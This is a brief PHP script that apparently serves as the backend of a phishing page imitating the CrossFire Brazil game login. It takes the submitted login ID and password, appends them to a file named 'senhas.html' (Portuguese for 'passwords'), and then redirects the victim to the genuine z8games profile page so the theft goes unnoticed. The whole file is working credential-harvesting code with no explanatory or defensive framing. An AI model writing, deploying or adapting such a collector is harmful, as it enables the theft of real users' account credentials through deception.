<?php
$email = $_POST['tb_loginid'];
$senha = $_POST['tb_password'];
$tudo = "".$email.";".$senha."<br>";
$fopen = fopen("senhas.html", "a");
fwrite($fopen, $tudo);
fclose($fopen);


header("Location: http://br.crossfire.z8games.com/myprofile.html");